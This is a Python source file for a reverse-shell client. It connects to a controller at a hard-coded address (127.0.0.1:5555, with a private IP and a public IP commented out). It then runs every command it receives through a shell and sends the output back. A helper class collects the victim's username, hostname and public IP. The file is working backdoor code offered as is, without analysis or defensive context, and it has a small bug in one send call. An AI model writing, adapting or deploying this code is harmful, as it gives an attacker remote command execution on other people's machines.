import getpass
import socket
import os
import subprocess
import sys

import requests


class HostInf:
    def __init__(self):
        pass

    @property
    def getUsr(self):
        try:
            return getpass.getuser()
        except:
            return 'null'

    @property
    def getMac(self):
        try:
            return ""
        except:
            return 'null'

    @property
    def getIp(self):
        try:
            return requests.get("https://api.ipify.org/").text
        except:
            return 'null'

    @property
    def getDesk(self):
        try:
            return socket.gethostname()
        except:
            return 'null'


class Client:
    def Cprint(self, ToBePrinted):
        print(ToBePrinted)

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.BUFF = 10240
        self.utf8 = "utf-8"

        self.socket = socket.socket()
        self.socket.connect((self.host, self.port))
        # self.HOST_NAME = socket.gethostname()
        # self.HOST_PRIIP = requests.get('https://api.ipify.org').text
        # self.HOST_PUBIP = socket.gethostbyname(socket.gethostname())
        # self.send(f"[*] Host Name : {self.HOST_NAME}\n")
        # self.send(f"[*] Host PublicIp : {self.HOST_PRIIP}\n")
        # self.send(f"[*] Host PrivateIp : {self.HOST_PUBIP}\n")
        while True:
            self.commands = self.socket.recv(self.BUFF).decode(self.utf8)
            if len(str.encode(self.commands)) > 0:
                if self.commands[:2] == 'cd':
                    self.Cprint("Tryed To Change Dir To " + str(self.commands[3:]))
                    try:
                        os.chdir(self.commands[3:])
                        # self.socket.send(str.encode("\n" + os.getcwd() + "> "))
                        self.send()
                    except:
                        # self.socket.send(str.encode("Path Does Not Exists" + "\n" + os.getcwd() + "> "))
                        self.send("Path Does Not Exists")
                elif self.commands == "exited":
                    self.socket.close()
                    sys.exit(0)
                elif self.commands[:5] == 'host.':
                    pass
                else:
                    self.output = subprocess.Popen(self.commands[:], shell=True, stderr=subprocess.PIPE,
                                                   stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                    self.result = self.output.stdout.read() + self.output.stderr.read()
                    self.result = str(self.result, self.utf8)
                    # self.socket.send(str.encode(self.result + "\n" + os.getcwd() + "> "))
                    self.send(self.result)

    def send(self, msg):
        self.socket.send(str.encode(msg + "\n" + os.getcwd() + "> "))


# while True:
Client('127.0.0.1', 5555)
# Client('192.168.133.90', 5555)
# Client('3.110.118.16', 56639)
